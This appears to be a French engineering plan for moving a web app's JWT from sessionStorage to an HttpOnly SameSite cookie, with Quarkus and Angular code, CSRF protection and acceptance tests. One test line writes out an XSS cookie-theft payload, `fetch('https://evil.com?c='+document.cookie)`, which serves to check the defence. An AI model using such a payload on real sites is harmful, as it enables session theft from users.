# Step 1.2 : Migration du Token JWT vers Cookie HttpOnly

## Contexte

Actuellement, le token JWT est stocké dans `sessionStorage`, ce qui l'expose aux attaques XSS. Si un attaquant parvient à injecter du JavaScript malveillant (même via une vulnérabilité d'une dépendance tierce), il peut voler le token et usurper l'identité de l'utilisateur.

### État actuel

**Frontend - auth-state.service.ts :**
```typescript
const TOKEN_KEY = 'serenia_token';

setToken(token: string | null): void {
    this.tokenSignal.set(token);
    if (token) {
      sessionStorage.setItem(TOKEN_KEY, token); // ⚠️ Accessible via document.cookie / JS
    } else {
      sessionStorage.removeItem(TOKEN_KEY);
    }
}
```

**Backend - AuthenticationResource.java :**
```java
@POST
public Response login(@Valid LoginRequestDTO dto) {
    UserResponseDTO userProfile = authenticationService.login(dto);
    String token = jwtService.generateToken(userProfile);
    return Response.ok(new AuthResponseDTO(userProfile, token)).build(); // Token dans le body
}
```

### Fichiers concernés

| Fichier | Modification |
|---------|--------------|
| `AuthenticationResource.java` | Retourner token via Set-Cookie |
| `auth-state.service.ts` | Supprimer stockage sessionStorage |
| `auth.service.ts` | Adapter le flux de login |
| `http.interceptor.ts` | Ajouter withCredentials |
| `application.properties` | Configurer SameSite cookie |

### Analyse des risques

| Stockage | XSS | CSRF | Simplicité |
|----------|-----|------|------------|
| sessionStorage | ❌ Vulnérable | ✅ Protégé | ✅ Simple |
| localStorage | ❌ Vulnérable | ✅ Protégé | ✅ Simple |
| Cookie HttpOnly | ✅ Protégé | ⚠️ À mitiger | ⚠️ Moyen |
| Cookie HttpOnly + SameSite=Strict | ✅ Protégé | ✅ Protégé | ⚠️ Moyen |

---

## Objectif

1. **Migrer le stockage du JWT** vers un cookie `HttpOnly`, `Secure`, `SameSite=Strict`
2. **Protéger contre CSRF** via l'attribut SameSite et/ou double-submit cookie pattern
3. **Adapter le frontend** pour ne plus manipuler le token directement
4. **Maintenir la compatibilité** avec l'architecture existante
5. **Implémenter un endpoint de logout** qui supprime le cookie

---

## Méthode

### 1.2.1 Modification du Backend

#### Étape 1 : Créer une classe utilitaire pour les cookies

```java
package com.lofo.serenia.util;

import jakarta.ws.rs.core.NewCookie;
import jakarta.ws.rs.core.NewCookie.SameSite;
import java.time.Duration;

public final class CookieUtils {

    public static final String AUTH_COOKIE_NAME = "serenia_auth";
    
    private CookieUtils() {}

    public static NewCookie createAuthCookie(String token, Duration maxAge) {
        return new NewCookie.Builder(AUTH_COOKIE_NAME)
            .value(token)
            .path("/")
            .domain(null)           // Cookie valide pour le domaine actuel
            .secure(true)           // HTTPS uniquement
            .httpOnly(true)         // Non accessible via JavaScript
            .sameSite(SameSite.STRICT)  // Protection CSRF
            .maxAge((int) maxAge.toSeconds())
            .build();
    }

    public static NewCookie createLogoutCookie() {
        return new NewCookie.Builder(AUTH_COOKIE_NAME)
            .value("")
            .path("/")
            .secure(true)
            .httpOnly(true)
            .maxAge(0)              // Supprime le cookie
            .build();
    }
}
```

#### Étape 2 : Modifier AuthenticationResource

```java
package com.lofo.serenia.rest.resource;

import com.lofo.serenia.rest.dto.in.LoginRequestDTO;
import com.lofo.serenia.rest.dto.out.AuthResponseDTO;
import com.lofo.serenia.rest.dto.out.UserResponseDTO;
import com.lofo.serenia.service.user.authentication.AuthenticationService;
import com.lofo.serenia.service.user.jwt.JwtService;
import com.lofo.serenia.util.CookieUtils;
import jakarta.inject.Inject;
import jakarta.validation.Valid;
import jakarta.ws.rs.*;
import jakarta.ws.rs.core.MediaType;
import jakarta.ws.rs.core.Response;
import lombok.extern.slf4j.Slf4j;
import org.eclipse.microprofile.config.inject.ConfigProperty;
import org.eclipse.microprofile.openapi.annotations.Operation;
import org.eclipse.microprofile.openapi.annotations.responses.APIResponse;
import org.eclipse.microprofile.openapi.annotations.tags.Tag;

import java.time.Duration;

@Slf4j
@Path("/auth")
@Produces(MediaType.APPLICATION_JSON)
@Tag(name = "Authentication")
public class AuthenticationResource {

    private final AuthenticationService authenticationService;
    private final JwtService jwtService;
    
    @ConfigProperty(name = "serenia.auth.expiration-time", defaultValue = "86400")
    long tokenExpirationSeconds;

    @Inject
    public AuthenticationResource(AuthenticationService authenticationService, JwtService jwtService) {
        this.authenticationService = authenticationService;
        this.jwtService = jwtService;
    }

    @POST
    @Path("/login")
    @Consumes(MediaType.APPLICATION_JSON)
    @Operation(summary = "Login", description = "Authenticates the user and sets a secure HttpOnly cookie.")
    @APIResponse(responseCode = "200", description = "Authentication successful")
    @APIResponse(responseCode = "401", description = "Invalid credentials")
    public Response login(@Valid LoginRequestDTO dto) {
        log.info("User login attempted for email={}", maskEmail(dto.email()));

        UserResponseDTO userProfile = authenticationService.login(dto);
        String token = jwtService.generateToken(userProfile);

        // Créer le cookie HttpOnly
        var authCookie = CookieUtils.createAuthCookie(
            token, 
            Duration.ofSeconds(tokenExpirationSeconds)
        );

        log.debug("JWT cookie set for user={}", userProfile.id());
        
        // Retourner le profil SANS le token (le token est dans le cookie)
        return Response.ok(new AuthResponseDTO(userProfile, null))
            .cookie(authCookie)
            .build();
    }

    @POST
    @Path("/logout")
    @Operation(summary = "Logout", description = "Invalidates the authentication cookie.")
    @APIResponse(responseCode = "204", description = "Logout successful")
    public Response logout() {
        var logoutCookie = CookieUtils.createLogoutCookie();
        
        return Response.noContent()
            .cookie(logoutCookie)
            .build();
    }

    @GET
    @Path("/me")
    @Operation(summary = "Get current user", description = "Returns the current authenticated user from cookie.")
    @APIResponse(responseCode = "200", description = "User profile returned")
    @APIResponse(responseCode = "401", description = "Not authenticated")
    public Response getCurrentUser(@CookieParam("serenia_auth") String token) {
        if (token == null || token.isBlank()) {
            return Response.status(Response.Status.UNAUTHORIZED).build();
        }
        
        // Le token est validé par Quarkus JWT automatiquement
        // Cette méthode permet au frontend de récupérer le profil au refresh
        UserResponseDTO profile = authenticationService.getCurrentUserProfile();
        return Response.ok(profile).build();
    }

    private String maskEmail(String email) {
        if (email == null || !email.contains("@")) return "***";
        String[] parts = email.split("@");
        return parts[0].charAt(0) + "***@" + parts[1];
    }
}
```

#### Étape 3 : Configurer Quarkus pour lire le JWT depuis le cookie

Dans `application.properties` :

```properties
# JWT Configuration - Lecture depuis cookie
mp.jwt.token.header=Cookie
mp.jwt.token.cookie=serenia_auth

# Alternative: lecture depuis header Authorization ET cookie (fallback)
# smallrye.jwt.token.schemes=cookie,bearer
# smallrye.jwt.token.cookie.name=serenia_auth
```

#### Étape 4 : Configurer CORS pour les credentials

Dans `application.properties` :

```properties
# CORS - Important pour les cookies cross-origin
quarkus.http.cors=true
quarkus.http.cors.origins=https://serenia.studio,https://www.serenia.studio
quarkus.http.cors.methods=GET,POST,PUT,DELETE,OPTIONS,PATCH
quarkus.http.cors.headers=accept,authorization,content-type,x-requested-with
quarkus.http.cors.access-control-allow-credentials=true
```

### 1.2.2 Modification du Frontend

#### Étape 1 : Mettre à jour AuthStateService

```typescript
// auth-state.service.ts
import { computed, Injectable, signal } from '@angular/core';
import { User } from '../models/user.model';

@Injectable({
  providedIn: 'root',
})
export class AuthStateService {
  private readonly userSignal = signal<User | null>(null);
  private readonly loadingSignal = signal(false);
  
  // Plus besoin de tokenSignal - le cookie est géré par le navigateur

  readonly user = this.userSignal.asReadonly();
  readonly loading = this.loadingSignal.asReadonly();
  readonly isAuthenticated = computed(() => !!this.userSignal());
  readonly userFullName = computed(() => {
    const user = this.userSignal();
    return user ? `${user.firstName} ${user.lastName}` : '';
  });

  setUser(user: User | null): void {
    this.userSignal.set(user);
  }

  setLoading(loading: boolean): void {
    this.loadingSignal.set(loading);
  }

  clear(): void {
    this.userSignal.set(null);
    // Le cookie sera supprimé par l'appel à /auth/logout
  }

  // Plus de méthodes getStoredToken/setToken - le cookie est HttpOnly
}
```

#### Étape 2 : Mettre à jour AuthService

```typescript
// auth.service.ts
import { Injectable, inject } from '@angular/core';
import { HttpClient } from '@angular/common/http';
import { Observable, tap, catchError, of } from 'rxjs';
import { AuthStateService } from './auth-state.service';
import { User } from '../models/user.model';
import { environment } from '../../../environments/environment';

interface LoginResponse {
  user: User;
  // token n'est plus retourné - il est dans le cookie HttpOnly
}

@Injectable({
  providedIn: 'root',
})
export class AuthService {
  private readonly http = inject(HttpClient);
  private readonly authState = inject(AuthStateService);
  private readonly apiUrl = environment.apiUrl;

  login(email: string, password: string): Observable<LoginResponse> {
    return this.http.post<LoginResponse>(
      `${this.apiUrl}/auth/login`,
      { email, password },
      { withCredentials: true }  // IMPORTANT: envoie et reçoit les cookies
    ).pipe(
      tap(response => {
        this.authState.setUser(response.user);
      })
    );
  }

  logout(): Observable<void> {
    return this.http.post<void>(
      `${this.apiUrl}/auth/logout`,
      {},
      { withCredentials: true }
    ).pipe(
      tap(() => {
        this.authState.clear();
      })
    );
  }

  /**
   * Vérifie si l'utilisateur est authentifié au démarrage de l'app.
   * Appelle /auth/me pour valider le cookie et récupérer le profil.
   */
  checkAuth(): Observable<User | null> {
    return this.http.get<User>(
      `${this.apiUrl}/auth/me`,
      { withCredentials: true }
    ).pipe(
      tap(user => {
        this.authState.setUser(user);
      }),
      catchError(() => {
        this.authState.clear();
        return of(null);
      })
    );
  }
}
```

#### Étape 3 : Créer/Modifier l'intercepteur HTTP

```typescript
// http.interceptor.ts
import { HttpInterceptorFn, HttpErrorResponse } from '@angular/common/http';
import { inject } from '@angular/core';
import { Router } from '@angular/router';
import { catchError, throwError } from 'rxjs';
import { AuthStateService } from '../services/auth-state.service';
import { environment } from '../../../environments/environment';

export const authInterceptor: HttpInterceptorFn = (req, next) => {
  const router = inject(Router);
  const authState = inject(AuthStateService);
  
  // Ajouter withCredentials uniquement pour les requêtes vers notre API
  const isApiRequest = req.url.startsWith(environment.apiUrl);
  
  const secureReq = isApiRequest 
    ? req.clone({ withCredentials: true })
    : req;
  
  return next(secureReq).pipe(
    catchError((error: HttpErrorResponse) => {
      if (error.status === 401) {
        // Session expirée ou invalide
        authState.clear();
        router.navigate(['/login']);
      }
      return throwError(() => error);
    })
  );
};
```

#### Étape 4 : Configurer l'intercepteur dans app.config.ts

```typescript
// app.config.ts
import { ApplicationConfig, provideZoneChangeDetection } from '@angular/core';
import { provideRouter } from '@angular/router';
import { provideHttpClient, withInterceptors } from '@angular/common/http';
import { routes } from './app.routes';
import { authInterceptor } from './core/interceptors/http.interceptor';

export const appConfig: ApplicationConfig = {
  providers: [
    provideZoneChangeDetection({ eventCoalescing: true }),
    provideRouter(routes),
    provideHttpClient(
      withInterceptors([authInterceptor])
    ),
  ],
};
```

#### Étape 5 : Initialiser l'auth au démarrage (APP_INITIALIZER)

```typescript
// app.config.ts (ajout)
import { APP_INITIALIZER } from '@angular/core';
import { AuthService } from './core/services/auth.service';
import { firstValueFrom } from 'rxjs';

function initializeAuth(authService: AuthService) {
  return () => firstValueFrom(authService.checkAuth());
}

export const appConfig: ApplicationConfig = {
  providers: [
    // ... autres providers
    {
      provide: APP_INITIALIZER,
      useFactory: (authService: AuthService) => initializeAuth(authService),
      deps: [AuthService],
      multi: true,
    },
  ],
};
```

### 1.2.3 Gestion du CSRF (optionnel mais recommandé)

Bien que `SameSite=Strict` protège contre la plupart des attaques CSRF, une protection supplémentaire peut être ajoutée.

#### Pattern Double-Submit Cookie

**Backend - Ajouter un CSRF token :**

```java
// Dans AuthenticationResource.login()
String csrfToken = UUID.randomUUID().toString();

var csrfCookie = new NewCookie.Builder("serenia_csrf")
    .value(csrfToken)
    .path("/")
    .secure(true)
    .httpOnly(false)  // Doit être lisible par JS pour le header
    .sameSite(SameSite.STRICT)
    .maxAge((int) Duration.ofSeconds(tokenExpirationSeconds).toSeconds())
    .build();

return Response.ok(new AuthResponseDTO(userProfile, null))
    .cookie(authCookie)
    .cookie(csrfCookie)
    .build();
```

**Frontend - Envoyer le CSRF token dans un header :**

```typescript
// http.interceptor.ts
export const authInterceptor: HttpInterceptorFn = (req, next) => {
  // Lire le cookie CSRF (non HttpOnly)
  const csrfToken = getCookie('serenia_csrf');
  
  let secureReq = req.clone({ withCredentials: true });
  
  // Ajouter le header CSRF pour les requêtes mutatives
  if (csrfToken && ['POST', 'PUT', 'DELETE', 'PATCH'].includes(req.method)) {
    secureReq = secureReq.clone({
      headers: secureReq.headers.set('X-CSRF-Token', csrfToken)
    });
  }
  
  return next(secureReq);
};

function getCookie(name: string): string | null {
  const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
  return match ? match[2] : null;
}
```

**Backend - Valider le CSRF token (filtre) :**

```java
@Provider
@Priority(Priorities.AUTHENTICATION + 1)
public class CsrfFilter implements ContainerRequestFilter {

    @Override
    public void filter(ContainerRequestContext context) {
        String method = context.getMethod();
        
        // Skip pour GET, HEAD, OPTIONS
        if ("GET".equals(method) || "HEAD".equals(method) || "OPTIONS".equals(method)) {
            return;
        }
        
        Cookie csrfCookie = context.getCookies().get("serenia_csrf");
        String csrfHeader = context.getHeaderString("X-CSRF-Token");
        
        if (csrfCookie == null || csrfHeader == null || 
            !csrfCookie.getValue().equals(csrfHeader)) {
            context.abortWith(
                Response.status(Response.Status.FORBIDDEN)
                    .entity("{\"error\": \"CSRF token mismatch\"}")
                    .build()
            );
        }
    }
}
```

---

## Architecture

### Flux d'authentification avec Cookie HttpOnly

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    AUTHENTICATION FLOW WITH HTTPONLY COOKIE              │
└─────────────────────────────────────────────────────────────────────────┘

┌──────────────┐                    ┌──────────────┐                    ┌──────────────┐
│   Browser    │                    │   Backend    │                    │   Database   │
└──────┬───────┘                    └──────┬───────┘                    └──────┬───────┘
       │                                   │                                   │
       │  1. POST /auth/login              │                                   │
       │     Body: {email, password}       │                                   │
       │     withCredentials: true         │                                   │
       │──────────────────────────────────►│                                   │
       │                                   │                                   │
       │                                   │  2. Validate credentials          │
       │                                   │────────────────────────────────────►
       │                                   │                                   │
       │                                   │◄────────────────────────────────────
       │                                   │     User data                     │
       │                                   │                                   │
       │                                   │  3. Generate JWT                  │
       │                                   │                                   │
       │  4. Response 200                  │                                   │
       │     Body: {user: {...}}           │                                   │
       │     Set-Cookie: serenia_auth=JWT  │                                   │
       │       HttpOnly; Secure;           │                                   │
       │       SameSite=Strict             │                                   │
       │◄──────────────────────────────────│                                   │
       │                                   │                                   │
       │  5. Browser stores cookie         │                                   │
       │     (inaccessible to JS)          │                                   │
       │                                   │                                   │
       │  6. GET /api/conversations        │                                   │
       │     Cookie: serenia_auth=JWT      │                                   │
       │     (auto-attached by browser)    │                                   │
       │──────────────────────────────────►│                                   │
       │                                   │                                   │
       │                                   │  7. Validate JWT from cookie      │
       │                                   │                                   │
       │  8. Response 200                  │                                   │
       │     Body: conversations data      │                                   │
       │◄──────────────────────────────────│                                   │
```

### Comparaison sécurité

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    AVANT (sessionStorage)                                │
└─────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────┐
│  Browser JavaScript Context                                              │
│  ┌────────────────────────────────────────────────────────────────────┐ │
│  │  sessionStorage['serenia_token'] = "eyJhbGciOiJSUzI1NiI..."        │ │
│  │                         ▲                                          │ │
│  │                         │ ACCESSIBLE                               │ │
│  │  ┌────────────────┐     │                                          │ │
│  │  │  XSS Payload   │─────┘                                          │ │
│  │  │  fetch(...)    │  Can steal token and send to attacker          │ │
│  │  └────────────────┘                                                │ │
│  └────────────────────────────────────────────────────────────────────┘ │
└──────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│                    APRÈS (HttpOnly Cookie)                               │
└─────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────┐
│  Browser                                                                 │
│  ┌────────────────────────────────────────────────────────────────────┐ │
│  │  JavaScript Context                                                │ │
│  │  ┌────────────────┐                                                │ │
│  │  │  XSS Payload   │  ✗ Cannot access HttpOnly cookie               │ │
│  │  │  document.cookie → "" (serenia_auth not visible)                │ │
│  │  └────────────────┘                                                │ │
│  └────────────────────────────────────────────────────────────────────┘ │
│                                                                          │
│  ┌────────────────────────────────────────────────────────────────────┐ │
│  │  Cookie Storage (Browser Internal)                      🔒 SECURE │ │
│  │  ┌────────────────────────────────────────────────────────────────┐│ │
│  │  │  serenia_auth = "eyJhbGciOiJSUzI1NiI..."                       ││ │
│  │  │  Flags: HttpOnly, Secure, SameSite=Strict                      ││ │
│  │  └────────────────────────────────────────────────────────────────┘│ │
│  │  ▲                                                                 │ │
│  │  │ Auto-attached to requests by browser (not JS)                  │ │
│  └──┼─────────────────────────────────────────────────────────────────┘ │
│     │                                                                    │
│     └─────────────── Requests to api.serenia.studio                     │
└──────────────────────────────────────────────────────────────────────────┘
```

---

## Tests d'Acceptance

### TA-1.2.1 : Cookie HttpOnly Configuré Correctement

| # | Scénario | Action | Résultat Attendu |
|---|----------|--------|------------------|
| 1 | Login réussi | POST `/auth/login` avec credentials valides | Response contient `Set-Cookie` |
| 2 | Flags corrects | Inspecter le header Set-Cookie | Contient `HttpOnly; Secure; SameSite=Strict` |
| 3 | Path correct | Inspecter le cookie | `Path=/` |
| 4 | Expiration | Inspecter le cookie | `Max-Age` = durée configurée |

**Script de test :**

```bash
#!/bin/bash
# test_cookie_httponly.sh

API_URL="https://api.serenia.studio/auth/login"

echo "=== Test Cookie HttpOnly ==="

RESPONSE=$(curl -s -D - \
    -X POST "$API_URL" \
    -H "Content-Type: application/json" \
    -d '{"email":"valid@test.com","password":"validpassword"}' \
    2>&1)

echo "$RESPONSE" | grep -i "set-cookie"

# Vérifications
if echo "$RESPONSE" | grep -qi "httponly"; then
    echo "✅ HttpOnly flag present"
else
    echo "❌ HttpOnly flag MISSING"
fi

if echo "$RESPONSE" | grep -qi "secure"; then
    echo "✅ Secure flag present"
else
    echo "❌ Secure flag MISSING"
fi

if echo "$RESPONSE" | grep -qi "samesite=strict"; then
    echo "✅ SameSite=Strict present"
else
    echo "❌ SameSite=Strict MISSING"
fi
```

### TA-1.2.2 : Cookie Non Accessible via JavaScript

| # | Scénario | Action | Résultat Attendu |
|---|----------|--------|------------------|
| 1 | Après login | Exécuter `document.cookie` dans DevTools | `serenia_auth` NON listé |
| 2 | Tentative de vol | Script: `fetch('https://evil.com?c='+document.cookie)` | Cookie non envoyé (non visible) |

**Test manuel dans la console navigateur :**

```javascript
// Après login sur serenia.studio
console.log(document.cookie);
// Attendu: ne contient PAS "serenia_auth"

// Le cookie est visible dans DevTools > Application > Cookies
// mais avec le flag HttpOnly = ✓
```

### TA-1.2.3 : Requêtes API Fonctionnent avec Cookie

| # | Scénario | Action | Résultat Attendu |
|---|----------|--------|------------------|
| 1 | Requête authentifiée | GET `/profile` après login | 200 OK avec profil |
| 2 | Cookie envoyé auto | Inspecter requête dans DevTools | Header `Cookie: serenia_auth=...` |
| 3 | Sans login | GET `/profile` sans cookie | 401 Unauthorized |

**Test avec curl :**

```bash
# 1. Login et sauvegarder les cookies
curl -c cookies.txt -X POST "https://api.serenia.studio/auth/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"password"}'

# 2. Requête avec cookie
curl -b cookies.txt "https://api.serenia.studio/profile"
# Attendu: 200 OK avec profil

# 3. Requête sans cookie
curl "https://api.serenia.studio/profile"
# Attendu: 401 Unauthorized
```

### TA-1.2.4 : Logout Supprime le Cookie

| # | Scénario | Action | Résultat Attendu |
|---|----------|--------|------------------|
| 1 | Logout | POST `/auth/logout` | 204 No Content |
| 2 | Cookie supprimé | Inspecter Set-Cookie | `Max-Age=0` ou `expires=Thu, 01 Jan 1970` |
| 3 | Accès refusé | GET `/profile` après logout | 401 Unauthorized |

```bash
# Logout
curl -b cookies.txt -c cookies.txt -X POST "https://api.serenia.studio/auth/logout"

# Vérifier que le cookie est supprimé
cat cookies.txt | grep serenia_auth
# Attendu: ligne vide ou expirée

# Requête après logout
curl -b cookies.txt "https://api.serenia.studio/profile"
# Attendu: 401
```

### TA-1.2.5 : CORS Credentials Fonctionnel

| # | Scénario | Action | Résultat Attendu |
|---|----------|--------|------------------|
| 1 | Preflight OPTIONS | OPTIONS `/auth/login` depuis serenia.studio | `Access-Control-Allow-Credentials: true` |
| 2 | Origin autorisé | Requête depuis https://serenia.studio | Cookie accepté |
| 3 | Origin refusé | Requête depuis https://evil.com | Cookie non envoyé/reçu |

---

## Risques et Mitigations

### Risque : CSRF

**Mitigation appliquée :** `SameSite=Strict`
- Le cookie n'est envoyé que pour les requêtes provenant du même site
- Protection contre les attaques CSRF classiques (liens, formulaires malveillants)

**Mitigation supplémentaire (optionnelle) :** Double-submit cookie pattern

### Risque : Token Refresh

**État actuel :** Le token expire après X heures, l'utilisateur doit se reconnecter.

**Amélioration possible (hors scope) :** Implémenter un refresh token avec un endpoint `/auth/refresh` qui renouvelle le cookie.

---

## Critères de Complétion

- [ ] `CookieUtils.java` créé avec méthodes `createAuthCookie` et `createLogoutCookie`
- [ ] `AuthenticationResource.java` modifié pour retourner JWT via `Set-Cookie`
- [ ] Endpoint `/auth/logout` implémenté
- [ ] Endpoint `/auth/me` implémenté pour vérifier l'auth au refresh
- [ ] `application.properties` configuré pour lire JWT depuis cookie
- [ ] CORS configuré avec `access-control-allow-credentials=true`
- [ ] `auth-state.service.ts` modifié (suppression sessionStorage)
- [ ] `auth.service.ts` modifié avec `withCredentials: true`
- [ ] `http.interceptor.ts` configuré pour envoyer credentials
- [ ] `APP_INITIALIZER` configuré pour `checkAuth()` au démarrage
- [ ] Tests TA-1.2.1 à TA-1.2.5 passent
- [ ] (Optionnel) Protection CSRF double-submit implémentée
